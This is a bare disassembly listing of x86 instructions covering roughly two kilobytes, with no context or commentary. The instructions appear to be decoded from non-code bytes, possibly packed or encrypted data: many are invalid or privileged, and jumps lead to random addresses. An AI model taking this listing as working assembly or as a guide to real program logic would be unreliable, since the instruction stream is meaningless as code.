  40daf7:	sub    cl,BYTE PTR [edi+0x54f89100]
  40dafd:	paddq  mm0,QWORD PTR [edi-0x66]
  40db01:	jl     0x40db53
  40db03:	std    
  40db04:	jmp    0x40db7a
  40db06:	jns    0x40db7a
  40db08:	mov    ah,0x73
  40db0a:	pop    eax
  40db0b:	jnp    0x40daac
  40db0d:	icebp  
  40db0e:	clc    
  40db0f:	call   0x4bf394fd
  40db14:	cmc    
  40db15:	dec    ebp
  40db16:	clc    
  40db17:	cs mov bl,0x92
  40db1a:	ret    0xd54b
  40db1d:	sbb    eax,ebp
  40db1f:	dec    edi
  40db20:	or     DWORD PTR [edx],eax
  40db22:	adc    eax,0xf7c1842d
  40db27:	jg     0x40dacf
  40db29:	push   ecx
  40db2a:	add    BYTE PTR [ebx],ah
  40db2c:	ins    BYTE PTR es:[edi],dx
  40db2d:	sahf   
  40db2e:	mov    WORD PTR [ebx+0x2e692078],ss
  40db34:	cmp    esp,DWORD PTR [ebp+0x3d]
  40db37:	push   edi
  40db38:	xor    DWORD PTR [edx+ecx*4-0x7a7ee88e],ebp
  40db3f:	mov    dh,0xae
  40db41:	mov    bh,0x37
  40db43:	mov    cl,0x28
  40db45:	cmp    al,0x73
  40db47:	outs   dx,DWORD PTR ds:[esi]
  40db48:	cwde   
  40db49:	mov    ecx,0xb1a30baf
  40db4e:	xor    DWORD PTR [ebp+0x13ebb210],esi
  40db54:	jmp    0x2f336715
  40db59:	ja     0x40dbab
  40db5b:	(bad)  
  40db5c:	lods   al,BYTE PTR ds:[esi]
  40db5d:	popf   
  40db5e:	or     BYTE PTR [edx-0x39db3f27],dl
  40db64:	popf   
  40db65:	dec    edx
  40db66:	and    DWORD PTR [edi+0x138573ad],ebx
  40db6c:	xchg   esp,eax
  40db6d:	ins    DWORD PTR es:[edi],dx
  40db6e:	mov    ecx,0xf08aba05
  40db73:	cmp    DWORD PTR [ecx-0x3a2d6fc2],edx
  40db79:	mov    eax,0x5f19c765
  40db7e:	sbb    dl,BYTE PTR [edx-0x6]
  40db81:	fsub   DWORD PTR [ecx]
  40db83:	ins    DWORD PTR es:[edi],dx
  40db84:	xchg   ebp,eax
  40db85:	pop    ebp
  40db86:	outs   dx,BYTE PTR ds:[esi]
  40db87:	outs   dx,DWORD PTR ds:[esi]
  40db88:	aad    0xb4
  40db8a:	cld    
  40db8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db8c:	sbb    DWORD PTR [ecx-0x1aab9bb3],ebp
  40db92:	in     al,0x4
  40db94:	or     DWORD PTR [edi+0x2873a853],ebp
  40db9a:	loopne 0x40dbc8
  40db9c:	add    dl,BYTE PTR cs:[ecx+0x34]
  40dba0:	jno    0x40dbdf
  40dba2:	outs   dx,DWORD PTR ds:[esi]
  40dba3:	and    ch,BYTE PTR [eax+0xf]
  40dba6:	xchg   esp,eax
  40dba7:	popa   
  40dba8:	push   es
  40dba9:	sti    
  40dbaa:	sbb    bh,BYTE PTR [edi+0x6895b8a3]
  40dbb0:	fs cdq 
  40dbb2:	jp     0x40dc02
  40dbb4:	add    al,0xa2
  40dbb6:	std    
  40dbb7:	shl    ah,1
  40dbb9:	ror    BYTE PTR [esi+esi*2-0x18b163d6],cl
  40dbc0:	sbb    bl,ch
  40dbc2:	jmp    0x40db7d
  40dbc4:	loopne 0x40dbfc
  40dbc6:	adc    DWORD PTR [eax],ebp
  40dbc8:	adc    ecx,esi
  40dbca:	cmp    ch,bh
  40dbcc:	mov    bh,BYTE PTR ds:0xa7c4947d
  40dbd2:	and    eax,0x46a89cf8
  40dbd7:	jmp    0x9aafe698
  40dbdc:	in     al,0x37
  40dbde:	add    dl,ah
  40dbe0:	push   edx
  40dbe1:	popf   
  40dbe2:	pop    esp
  40dbe3:	mov    WORD PTR [ebx-0x73],fs
  40dbe6:	imul   ebx,DWORD PTR [ebp+0x5ecdd0c8],0xdde41d32
  40dbf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbf1:	pop    eax
  40dbf2:	xchg   edx,eax
  40dbf3:	add    cl,BYTE PTR [esi+0x11cbef47]
  40dbf9:	lods   al,BYTE PTR ds:[esi]
  40dbfa:	pop    esi
  40dbfb:	loopne 0x40dc3a
  40dbfd:	aas    
  40dbfe:	ret    
  40dbff:	ror    DWORD PTR ds:0x1273b1d2,1
  40dc05:	mov    ds:0xc99ff74a,al
  40dc0a:	mov    ecx,0x9d92a36b
  40dc0f:	mov    edx,DWORD PTR [edi-0x400ff12]
  40dc15:	js     0x40dbc0
  40dc17:	pop    ebx
  40dc18:	xor    eax,edi
  40dc1a:	cmp    cl,al
  40dc1c:	ins    BYTE PTR es:[edi],dx
  40dc1d:	xor    BYTE PTR [esi-0x31],dl
  40dc20:	cli    
  40dc21:	fs jp  0x40dbc7
  40dc24:	inc    esp
  40dc25:	pop    eax
  40dc26:	arpl   si,bx
  40dc28:	call   0x3eeaacd6
  40dc2d:	push   edx
  40dc2e:	jo     0x40dcaf
  40dc30:	cmp    eax,0x5ef5d101
  40dc35:	call   0xd4dcf6ab
  40dc3a:	push   edx
  40dc3b:	xchg   ebx,eax
  40dc3c:	cmp    al,0x4d
  40dc3e:	dec    edi
  40dc3f:	ins    BYTE PTR es:[edi],dx
  40dc40:	and    BYTE PTR [eax],ah
  40dc42:	ds pushf 
  40dc44:	out    dx,al
  40dc45:	sub    eax,0x98a69ec8
  40dc4a:	xchg   edi,eax
  40dc4b:	imul   ebx,ebx,0x519624fc
  40dc51:	in     eax,0xb9
  40dc53:	hlt    
  40dc54:	call   0xfaf31ecf
  40dc59:	int3   
  40dc5a:	(bad)  
  40dc5b:	push   cs
  40dc5c:	cmp    al,0x81
  40dc5e:	dec    eax
  40dc5f:	retf   
  40dc60:	inc    ebx
  40dc61:	inc    esi
  40dc62:	adc    cl,BYTE PTR [ebp-0x46401770]
  40dc68:	repnz dec esi
  40dc6a:	mov    al,0x2b
  40dc6c:	sbb    eax,0x90eee5f8
  40dc71:	ja     0x40dc2b
  40dc73:	mov    cl,0x69
  40dc75:	bound  ebp,QWORD PTR [ebx+eax*8]
  40dc78:	cli    
  40dc79:	mov    ah,0x48
  40dc7b:	or     al,0x34
  40dc7d:	stos   DWORD PTR es:[edi],eax
  40dc7e:	jbe    0x40dcc3
  40dc80:	mov    al,ds:0x6be8992a
  40dc85:	outs   dx,DWORD PTR cs:[esi]
  40dc87:	fbld   TBYTE PTR [ebx]
  40dc89:	(bad)  
  40dc8a:	aaa    
  40dc8b:	push   esp
  40dc8c:	add    ecx,DWORD PTR [ecx]
  40dc8e:	enter  0x2b00,0xb6
  40dc92:	idiv   BYTE PTR [ebx]
  40dc94:	sub    BYTE PTR [esi],0xc
  40dc97:	daa    
  40dc98:	sub    al,0x82
  40dc9a:	sub    al,0x31
  40dc9c:	jno    0x40dc51
  40dc9e:	aas    
  40dc9f:	or     cl,cl
  40dca1:	hlt    
  40dca2:	stc    
  40dca3:	imul   ebx,DWORD PTR [eax+0x66],0x6c
  40dca7:	jb     0x40dc74
  40dca9:	ret    
  40dcaa:	popa   
  40dcab:	inc    esp
  40dcac:	cli    
  40dcad:	mov    edx,0x6886fa23
  40dcb2:	aad    0x3a
  40dcb4:	hlt    
  40dcb5:	sbb    al,0xa7
  40dcb7:	adc    BYTE PTR [edi+ebx*1+0x64],al
  40dcbb:	cmc    
  40dcbc:	test   al,0x9a
  40dcbe:	in     eax,0x23
  40dcc0:	stc    
  40dcc1:	inc    esi
  40dcc2:	mov    WORD PTR [edx],gs
  40dcc4:	mov    esi,ds
  40dcc6:	(bad)  
  40dcc7:	mov    esp,0x308b2e87
  40dccc:	adc    BYTE PTR [ebx-0x24629535],ch
  40dcd2:	bound  eax,QWORD PTR [ebx-0x54]
  40dcd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcd6:	test   eax,0x899a441f
  40dcdb:	fs call 0xf16e5918
  40dce1:	mov    ch,0xf6
  40dce3:	aaa    
  40dce4:	push   edi
  40dce5:	ret    0x93f3
  40dce8:	xor    BYTE PTR [ebx-0x1d],al
  40dceb:	enter  0x1f8c,0xaf
  40dcef:	clc    
  40dcf0:	sub    eax,0xec323b7f
  40dcf5:	sub    DWORD PTR [eax-0x42a5ad83],eax
  40dcfb:	mov    edx,0xf5b01ef7
  40dd00:	(bad)
  40dd05:	mov    DWORD PTR ds:0x7e12863f,0x820758bb
  40dd0f:	add    al,0x4f
  40dd11:	pop    ebx
  40dd12:	shl    BYTE PTR [ebx-0x48],1
  40dd15:	sahf   
  40dd16:	cdq    
  40dd17:	pop    eax
  40dd18:	cld    
  40dd19:	xchg   edx,eax
  40dd1a:	in     al,0xf8
  40dd1c:	ror    ecx,cl
  40dd1e:	cld    
  40dd1f:	mov    ebp,0xe240a2d0
  40dd24:	or     ch,BYTE PTR [ebx]
  40dd26:	xor    DWORD PTR ds:0xfb17e1b3,ecx
  40dd2c:	call   0x26303d66
  40dd31:	cmp    bh,bl
  40dd33:	cmc    
  40dd34:	mov    ds:0x54699f9,eax
  40dd39:	xor    cl,BYTE PTR es:[eax]
  40dd3c:	std    
  40dd3d:	add    BYTE PTR [ebx+0x5d],ch
  40dd40:	lods   al,BYTE PTR ds:[esi]
  40dd41:	push   ss
  40dd42:	mov    al,0x6f
  40dd44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd45:	fcomip st,st(6)
  40dd47:	inc    edx
  40dd48:	ret    
  40dd49:	outs   dx,DWORD PTR ds:[esi]
  40dd4a:	sub    ah,BYTE PTR [edx+0x50]
  40dd4d:	ins    DWORD PTR es:[edi],dx
  40dd4e:	add    ebp,DWORD PTR [eax]
  40dd50:	dec    esp
  40dd51:	mov    eax,ds:0x9f6fcec2
  40dd56:	jno    0x40dd49
  40dd58:	xchg   ebx,eax
  40dd59:	mov    bh,0xbf
  40dd5b:	dec    edi
  40dd5c:	mov    DWORD PTR [esi+0x22],0x27baf13d
  40dd63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd64:	psubd  mm6,QWORD PTR [ecx-0x68]
  40dd68:	inc    ecx
  40dd69:	cwde   
  40dd6a:	hlt    
  40dd6b:	pusha  
  40dd6c:	jmp    0xb5609e9e
  40dd71:	sahf   
  40dd72:	ret    
  40dd73:	shl    edi,cl
  40dd75:	cwde   
  40dd76:	mov    al,ds:0xc3d64e79
  40dd7b:	and    DWORD PTR [edi],0x34
  40dd7e:	fsub   QWORD PTR [eax]
  40dd80:	cmc    
  40dd81:	mov    ecx,0xfe835255
  40dd86:	lds    eax,FWORD PTR [ebx]
  40dd88:	push   edi
  40dd89:	(bad)  
  40dd8a:	cmp    eax,0x96dbe9da
  40dd8f:	dec    edi
  40dd90:	mov    dh,0xec
  40dd92:	push   0x52
  40dd94:	jae    0x40dda0
  40dd96:	xor    DWORD PTR [ebx],0xfb8b63b8
  40dd9c:	cmc    
  40dd9d:	es lahf 
  40dd9f:	jmp    0x40dd8e
  40dda1:	jecxz  0x40dddf
  40dda3:	dec    DWORD PTR [ebx-0x7e]
  40dda6:	inc    edi
  40dda7:	pushf  
  40dda8:	xchg   edi,eax
  40dda9:	inc    ebx
  40ddaa:	cmc    
  40ddab:	fisubr WORD PTR [edx]
  40ddad:	je     0x40ddf9
  40ddaf:	ror    DWORD PTR [edi+ecx*4],0xd6
  40ddb3:	push   0x7
  40ddb5:	popf   
  40ddb6:	fsubr  QWORD PTR [ecx+ebp*8-0x53b551ec]
  40ddbd:	push   ebp
  40ddbe:	push   ss
  40ddbf:	push   esp
  40ddc0:	sub    al,0x43
  40ddc2:	frstor [ebx-0x6d0b6252]
  40ddc8:	psrld  mm1,mm7
  40ddcb:	sbb    eax,0x2f8b3468
  40ddd0:	int    0xd7
  40ddd2:	cmp    al,0x99
  40ddd4:	sub    eax,0xd397389c
  40ddd9:	mov    DWORD PTR [ecx-0x69],edx
  40dddc:	jmp    0x5bae:0xc6807de6
  40dde3:	lods   eax,DWORD PTR ds:[esi]
  40dde4:	outs   dx,BYTE PTR ds:[esi]
  40dde5:	retf   
  40dde6:	in     al,0xa9
  40dde8:	sub    al,BYTE PTR [edx]
  40ddea:	imul   edi,DWORD PTR [eax+0x72],0xffffffa7
  40ddee:	xor    DWORD PTR [eax+ebx*2-0x1c],ebp
  40ddf2:	sti    
  40ddf3:	or     DWORD PTR [edi-0x3285be45],esp
  40ddf9:	or     DWORD PTR [ecx+0x51],0xe6f7ec6e
  40de00:	popa   
  40de01:	dec    ebx
  40de02:	inc    ebx
  40de03:	mov    ebp,0xe1f34a
  40de08:	dec    esp
  40de09:	xor    dh,BYTE PTR [edi+0x1e]
  40de0c:	iret   
  40de0d:	lahf   
  40de0e:	fnstenv [ecx+eax*4+0x68]
  40de12:	sub    esp,DWORD PTR [edx+0x1223d05f]
  40de18:	das    
  40de19:	xor    dl,al
  40de1b:	loope  0x40ddd8
  40de1d:	inc    edx
  40de1e:	push   esi
  40de1f:	xor    eax,0xe284d3f6
  40de24:	pop    edx
  40de25:	test   BYTE PTR [edi+0x75],bh
  40de28:	jnp    0x40de1d
  40de2a:	jle    0x40de11
  40de2c:	stos   BYTE PTR es:[edi],al
  40de2d:	jno    0x40ddbe
  40de2f:	dec    eax
  40de30:	sti    
  40de31:	sbb    ah,al
  40de33:	push   ebx
  40de34:	aad    0x37
  40de36:	cwde   
  40de37:	or     ecx,DWORD PTR [ecx+0x464b3471]
  40de3d:	ret    
  40de3e:	pop    es
  40de3f:	loop   0x40de3f
  40de41:	jae    0x40de1f
  40de43:	jmp    0x6b1f:0xe157ffb1
  40de4a:	mov    ecx,0xdf46e72b
  40de4f:	sub    BYTE PTR [edx-0x4e],bh
  40de52:	inc    edx
  40de53:	lods   eax,DWORD PTR ds:[esi]
  40de54:	sub    BYTE PTR [esi+0x64a0bd92],bh
  40de5a:	jno    0x40de1d
  40de5c:	mov    dh,BYTE PTR [ebx-0x6]
  40de5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de60:	add    DWORD PTR [ecx+edi*2-0x8],ebp
  40de64:	inc    edx
  40de65:	int    0xb2
  40de67:	or     BYTE PTR [esi+0x77],bl
  40de6a:	ds inc eax
  40de6c:	aad    0x60
  40de6e:	popf   
  40de6f:	or     DWORD PTR [ecx],ebx
  40de71:	repz push edi
  40de73:	xchg   ebp,eax
  40de74:	imul   edi,DWORD PTR [ecx],0xffffffaf
  40de77:	idiv   DWORD PTR [edx+esi*4-0x2c595ef6]
  40de7e:	in     al,dx
  40de7f:	in     al,0xbf
  40de81:	jp     0x40ded0
  40de83:	or     edx,ecx
  40de85:	sbb    DWORD PTR [edx-0x1b2636bd],ecx
  40de8b:	xchg   ecx,eax
  40de8c:	retf   0xe927
  40de8f:	xor    eax,0x1dfcf82
  40de94:	jbe    0x40deaf
  40de96:	fisttp QWORD PTR [edx]
  40de98:	pushf  
  40de99:	jae    0x40de54
  40de9b:	cmc    
  40de9c:	mov    dh,BYTE PTR [ebp+0x71]
  40de9f:	cmc    
  40dea0:	repnz xor edi,DWORD PTR [ebp+0x7af8292b]
  40dea7:	pop    ecx
  40dea8:	aas    
  40dea9:	loope  0x40deae
  40deab:	and    eax,0xe453fc6b
  40deb0:	fwait
  40deb1:	cli    
  40deb2:	je     0x40deeb
  40deb4:	xor    BYTE PTR [eax],bl
  40deb6:	fisub  WORD PTR [eax+0x7f]
  40deb9:	leave  
  40deba:	aaa    
  40debb:	jb     0x40df34
  40debd:	adc    al,0x4d
  40debf:	lahf   
  40dec0:	push   esp
  40dec1:	sbb    al,0xf1
  40dec3:	icebp  
  40dec4:	xor    edx,edx
  40dec6:	jns    0x40de62
  40dec8:	fdivr  QWORD PTR [edi+0x5a55f2fb]
  40dece:	loop   0x40df20
  40ded0:	jae    0x40deaa
  40ded2:	mov    WORD PTR [ebx],fs
  40ded4:	jecxz  0x40df54
  40ded6:	jmp    0xdd68:0x90f00d00
  40dedd:	out    dx,al
  40dede:	test   BYTE PTR [ebx-0x6f],0xd3
  40dee2:	inc    ebp
  40dee3:	pop    DWORD PTR [esi+ecx*8+0xa657dfc]
  40deea:	push   ebx
  40deeb:	add    ah,BYTE PTR [esp+ebx*4-0x4922f223]
  40def2:	mov    WORD PTR [ecx-0x34],fs
  40def5:	(bad)  
  40def6:	clc    
  40def7:	imul   ebp,DWORD PTR [ebx+0x16],0x23
  40defb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40defc:	pop    edx
  40defd:	or     edi,DWORD PTR [ebp+0x54]
  40df00:	mov    ah,0x15
  40df02:	xor    BYTE PTR [edx-0xa],dl
  40df05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df06:	push   eax
  40df07:	jbe    0x40dee7
  40df09:	fisttp DWORD PTR [ecx]
  40df0b:	sub    si,WORD PTR [edx-0x236de957]
  40df12:	pop    esi
  40df13:	cmp    eax,0x8d65137d
  40df18:	lock ss (bad) 
  40df1b:	(bad)  
  40df1c:	or     edi,DWORD PTR [esi-0x775272ca]
  40df22:	fisttp WORD PTR [edx-0x5f]
  40df25:	pop    ebp
  40df26:	fwait
  40df27:	unpckhps xmm3,XMMWORD PTR [edi-0x60ac0445]
  40df2e:	pop    ebp
  40df2f:	scas   al,BYTE PTR es:[edi]
  40df30:	mov    ds:0xe4199b1c,eax
  40df35:	shr    edi,0xa2
  40df38:	jno    0x40dede
  40df3a:	add    DWORD PTR [edi],esp
  40df3c:	outs   dx,BYTE PTR ds:[esi]
  40df3d:	(bad)  [ebp-0x8]
  40df40:	xchg   ebp,eax
  40df41:	cmp    al,0x46
  40df43:	retf   0xf510
  40df46:	addr16 pop esi
  40df48:	pop    ecx
  40df49:	inc    ebp
  40df4a:	dec    edi
  40df4b:	or     ebp,DWORD PTR [esp+eax*2]
  40df4e:	ror    DWORD PTR [ebp*1-0x63bca2a8],1
  40df55:	mov    ah,0x77
  40df57:	outs   dx,BYTE PTR ds:[esi]
  40df58:	push   0xffffffcf
  40df5a:	add    eax,0xae4f2c26
  40df5f:	fadd   DWORD PTR ds:0xd791dc2b
  40df65:	popa   
  40df66:	ins    DWORD PTR es:[edi],dx
  40df67:	(bad)  
  40df68:	aad    0x4d
  40df6a:	xor    ah,BYTE PTR [edx+0x17]
  40df6d:	pop    ss
  40df6e:	inc    DWORD PTR [edx+0x5]
  40df71:	adc    BYTE PTR [ecx],dh
  40df73:	sub    eax,0x1a8bda7d
  40df78:	or     eax,DWORD PTR [eax-0x68]
  40df7b:	jns    0x40dfae
  40df7d:	std    
  40df7e:	xchg   ebp,eax
  40df7f:	inc    ebx
  40df80:	rdtsc  
  40df82:	ins    BYTE PTR es:[edi],dx
  40df83:	gs mov bl,0x60
  40df86:	xor    al,BYTE PTR [ebx]
  40df88:	je     0x40dfd7
  40df8a:	cmp    DWORD PTR [ebp-0x2d5d0c4b],ecx
  40df90:	xor    al,0xbd
  40df92:	inc    esi
  40df93:	cmp    al,0xe6
  40df95:	ror    ah,0x22
  40df98:	xlat   BYTE PTR ds:[ebx]
  40df99:	leave  
  40df9a:	ins    BYTE PTR es:[edi],dx
  40df9b:	retf   
  40df9c:	push   cs
  40df9d:	xchg   esi,eax
  40df9e:	fld    QWORD PTR [ebp+0x1f422449]
  40dfa4:	scas   eax,DWORD PTR es:[edi]
  40dfa5:	ins    BYTE PTR es:[edi],dx
  40dfa6:	outs   dx,DWORD PTR ds:[esi]
  40dfa7:	inc    esp
  40dfa8:	sti    
  40dfa9:	add    al,0x1f
  40dfab:	mov    edi,0xc468c4e6
  40dfb0:	jbe    0x40dfe9
  40dfb2:	lock inc esi
  40dfb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfb5:	shl    BYTE PTR [edi],cl
  40dfb7:	add    BYTE PTR [ebx],dh
  40dfb9:	xor    DWORD PTR [ebp-0x39],ebp
  40dfbc:	shl    BYTE PTR [ebx+0x68],0x54
  40dfc0:	pop    ebx
  40dfc1:	jo     0x40e02b
  40dfc3:	jno    0x40df9c
  40dfc5:	(bad)
  40dfc8:	or     dl,BYTE PTR [edx-0x1c]
  40dfcb:	(bad)  
  40dfcc:	adc    DWORD PTR [eax+0x28],ebx
  40dfcf:	into   
  40dfd0:	jmp    0x5bb14561
  40dfd5:	pop    eax
  40dfd6:	popf   
  40dfd7:	mov    esi,0x11f549f2
  40dfdc:	mov    al,ds:0xc2d2c0f3
  40dfe1:	loop   0x40dffc
  40dfe3:	dec    ebx
  40dfe4:	jl     0x40df7b
  40dfe6:	jb     0x40e036
  40dfe8:	pop    es
  40dfe9:	sub    BYTE PTR [edi-0x492ce7f8],dh
  40dfef:	sub    BYTE PTR [ebp-0x57073546],0xb4
  40dff6:	sub    bh,BYTE PTR [ecx+0x595b43cd]
  40dffc:	jb     0x40df86
  40dffe:	mov    eax,ds:0x6b64232
  40e003:	push   ebp
  40e004:	push   0x45a4753a
  40e009:	jo     0x40e05c
  40e00b:	pop    eax
  40e00c:	mul    DWORD PTR [eax+eiz*1]
  40e00f:	sub    BYTE PTR [ebx+edi*4],bh
  40e012:	mov    dh,0x55
  40e014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e015:	mov    ebp,0xb3211b78
  40e01a:	push   esp
  40e01b:	shl    BYTE PTR [edx+0x45e93972],cl
  40e021:	push   ss
  40e022:	test   eax,0xf5e233b3
  40e027:	arpl   si,ax
  40e029:	hlt    
  40e02a:	mov    dh,0x3d
  40e02c:	(bad)  
  40e02d:	in     al,0x56
  40e02f:	xor    esi,DWORD PTR ds:0x2ff3ea6c
  40e035:	add    eax,0xe1a597f4
  40e03a:	mov    ch,0xce
  40e03c:	ret    0x3a11
  40e03f:	out    dx,eax
  40e040:	xchg   edx,eax
  40e041:	mov    ebx,0xcd5f0d3c
  40e046:	int    0xc0
  40e048:	sub    eax,0xe0366c4
  40e04d:	retf   0x3e08
  40e050:	mov    bl,0xd3
  40e052:	hlt    
  40e053:	fs test al,0x84
  40e056:	jbe    0x40e0d2
  40e058:	loope  0x40e084
  40e05a:	test   bl,dh
  40e05c:	pop    edx
  40e05d:	xor    DWORD PTR [ebp+0x15da7b5e],edx
  40e063:	inc    esi
  40e064:	push   ecx
  40e065:	test   eax,0x29fae1c9
  40e06a:	jb     0x40e09c
  40e06c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e06d:	pop    esi
  40e06e:	jbe    0x40e04f
  40e070:	mov    bh,0x35
  40e072:	xchg   esi,eax
  40e073:	push   cs
  40e074:	push   ecx
  40e075:	mov    BYTE PTR [ebp+0x30c17609],bh
  40e07b:	or     DWORD PTR [ecx+0x48],ebp
  40e07e:	dec    edi
  40e07f:	push   ecx
  40e080:	adc    al,0xdd
  40e082:	or     DWORD PTR [eax+0x6c18931c],0x20896412
  40e08c:	stc    
  40e08d:	mov    ecx,0x310ef7a9
  40e092:	das    
  40e093:	dec    eax
  40e094:	(bad)  
  40e095:	shl    BYTE PTR [ecx],1
  40e097:	(bad)  
  40e098:	fs in  al,0x2e
  40e09b:	and    eax,0x7e3a7ebc
  40e0a0:	or     eax,0xb0e1d533
  40e0a5:	icebp  
  40e0a6:	pop    ecx
  40e0a7:	fsubr  DWORD PTR [esi-0x5]
  40e0aa:	dec    edx
  40e0ab:	out    0x9d,eax
  40e0ad:	out    0xb5,al
  40e0af:	push   ss
  40e0b0:	xchg   ecx,eax
  40e0b1:	aad    0xa1
  40e0b3:	outs   dx,DWORD PTR ds:[esi]
  40e0b4:	rol    DWORD PTR ds:0x9633c2f0,cl
  40e0ba:	icebp  
  40e0bb:	popf   
  40e0bc:	jmp    0xf40fc738
  40e0c1:	rol    DWORD PTR [edi],cl
  40e0c3:	gs mov dl,0xc0
  40e0c6:	lods   al,BYTE PTR ds:[esi]
  40e0c7:	inc    edi
  40e0c8:	shl    al,cl
  40e0ca:	stos   BYTE PTR es:[edi],al
  40e0cb:	mov    edi,gs
  40e0cd:	cmp    al,BYTE PTR [ebp+0x102b0a9d]
  40e0d3:	xor    al,0xd7
  40e0d5:	rcr    DWORD PTR [edi],cl
  40e0d7:	pusha  
  40e0d8:	mov    bl,BYTE PTR [ebx+0x501dcf4c]
  40e0de:	fiadd  WORD PTR [eax+0x55]
  40e0e1:	or     ch,BYTE PTR [edx+0x26]
  40e0e4:	scas   al,BYTE PTR es:[edi]
  40e0e5:	mov    esp,0xe1fb1491
  40e0ea:	add    eax,DWORD PTR [edx-0x1e]
  40e0ed:	mov    ecx,0x6005b528
  40e0f2:	stos   DWORD PTR es:[edi],eax
  40e0f3:	or     esi,DWORD PTR [eax+0x29d7437f]
  40e0f9:	lock jno 0x40e0be
  40e0fc:	loop   0x40e122
  40e0fe:	pop    eax
  40e0ff:	inc    BYTE PTR [edx]
  40e101:	xor    DWORD PTR [ebp-0x22eb8519],esi
  40e107:	sub    BYTE PTR [edi],dl
  40e109:	pop    es
  40e10a:	pop    ebp
  40e10b:	fwait
  40e10c:	not    BYTE PTR [ebx-0x5b]
  40e10f:	stos   DWORD PTR es:[edi],eax
  40e110:	cld    
  40e111:	fs inc eax
  40e113:	push   eax
  40e114:	push   edi
  40e115:	or     al,0x5b
  40e117:	jno    0x40e0e8
  40e119:	jmp    0xf688:0x594dbc38
  40e120:	call   0x8d81b292
  40e125:	not    DWORD PTR [edi]
  40e127:	arpl   WORD PTR [ebx+ebx*8],si
  40e12a:	sti    
  40e12b:	sar    BYTE PTR ds:0x879eb9b1,0x97
  40e132:	add    BYTE PTR [esi+0x4c],dl
  40e135:	mov    ?,WORD PTR [ecx-0x342c1671]
  40e13b:	jg     0x40e18d
  40e13d:	cmp    ebx,ecx
  40e13f:	mov    ah,0xbc
  40e141:	and    ebp,ecx
  40e143:	cmp    DWORD PTR [ebp+eax*8-0x5eca6213],0x4b
  40e14b:	inc    ebp
  40e14c:	push   ebx
  40e14d:	sahf   
  40e14e:	enter  0x1131,0x65
  40e152:	jae    0x40e15b
  40e154:	inc    ebx
  40e155:	pop    ecx
  40e156:	pop    esi
  40e157:	xchg   esp,eax
  40e158:	dec    ebx
  40e159:	inc    edx
  40e15a:	std    
  40e15b:	jecxz  0x40e1c3
  40e15d:	rcr    DWORD PTR [eax+ebx*1],cl
  40e160:	jge    0x40e19c
  40e162:	out    dx,eax
  40e163:	je     0x40e14b
  40e165:	in     al,dx
  40e166:	cmp    DWORD PTR [esi-0x622c11d4],ebp
  40e16c:	adc    eax,0x34696519
  40e171:	(bad)  
  40e172:	cmc    
  40e173:	outs   dx,DWORD PTR ds:[esi]
  40e174:	sub    edx,esi
  40e176:	pop    ss
  40e177:	jecxz  0x40e1e5
  40e179:	ss call 0x8d60:0x5653fdb1
  40e181:	loop   0x40e10b
  40e183:	xchg   esi,eax
  40e184:	or     dh,BYTE PTR [esi-0x48]
  40e187:	mov    edx,0xe846a4a4
  40e18c:	jbe    0x40e16e
  40e18e:	fisubr DWORD PTR [ebx+0x6e]
  40e191:	data16 jecxz 0x40e171
  40e194:	rcl    BYTE PTR [ecx+0x23],0x29
  40e198:	inc    ebp
  40e199:	(bad)  
  40e19a:	mov    eax,0x9bc29e59
  40e19f:	lds    edx,FWORD PTR [esi-0x5b70b74e]
  40e1a5:	xor    eax,0xa916b2a5
  40e1aa:	fimul  DWORD PTR [ebp+ebp*1-0x35]
  40e1ae:	add    ah,BYTE PTR [edi+0x77]
  40e1b1:	sbb    dl,BYTE PTR [eax-0x30747a16]
  40e1b7:	cdq    
  40e1b8:	(bad)  
  40e1b9:	or     ax,0xe28f
  40e1bd:	ficomp WORD PTR [eax-0x15]
  40e1c0:	outs   dx,BYTE PTR ds:[esi]
  40e1c1:	push   esi
  40e1c2:	int    0x4a
  40e1c4:	xchg   BYTE PTR [edx+0x2fd22f03],dl
  40e1ca:	or     al,0xc9
  40e1cc:	in     al,0xec
  40e1ce:	add    al,0xa8
  40e1d0:	test   eax,0xbf9a60b9
  40e1d5:	adc    DWORD PTR [ebp-0x2e],esi
  40e1d8:	cwde   
  40e1d9:	sub    dh,cl
  40e1db:	adc    esp,DWORD PTR ds:0xd4110f4d
  40e1e1:	inc    ebx
  40e1e2:	gs and al,0x30
  40e1e5:	ds (bad) 
  40e1e7:	das    
  40e1e8:	in     eax,dx
  40e1e9:	fstp   st(2)
  40e1eb:	sti    
  40e1ec:	add    al,0x44
  40e1ee:	jp     0x40e245
  40e1f0:	icebp  
  40e1f1:	or     ch,BYTE PTR [esi]
  40e1f3:	hlt    
  40e1f4:	pop    edi
  40e1f5:	loopne 0x40e219
  40e1f7:	jo     0x40e26b
  40e1f9:	pushf  
  40e1fa:	or     DWORD PTR [ecx+0x492075bf],esi
  40e200:	sub    al,0xfe
  40e202:	jbe    0x40e1a7
  40e204:	mov    dl,BYTE PTR [ecx-0x6e]
  40e207:	repnz and edx,DWORD PTR [edi+0x697ff254]
  40e20e:	ss out 0x1f,eax
  40e211:	in     eax,0x12
  40e213:	inc    edx
  40e214:	push   ebp
  40e215:	dec    eax
  40e216:	and    al,0x7a
  40e218:	xadd   BYTE PTR [edi+eax*2],bh
  40e21c:	pushf  
  40e21d:	mov    ah,0xc3
  40e21f:	mov    esp,DWORD PTR [edx]
  40e221:	fwait
  40e222:	lods   eax,DWORD PTR ds:[esi]
  40e224:	pop    esp
  40e225:	sub    al,0xb
  40e227:	arpl   WORD PTR [ebx],bp
  40e229:	fdiv   DWORD PTR [ebx+0x6c5657aa]
  40e22f:	mov    ah,bh
  40e231:	or     esi,DWORD PTR [edi]
  40e233:	mov    edx,0xb322c764
  40e238:	stc    
  40e239:	lock inc edi
  40e23b:	push   ebp
  40e23c:	jg     0x40e20d
  40e23e:	push   ds
  40e23f:	mov    dl,0x4f
  40e241:	js     0x40e22b
  40e243:	push   ebp
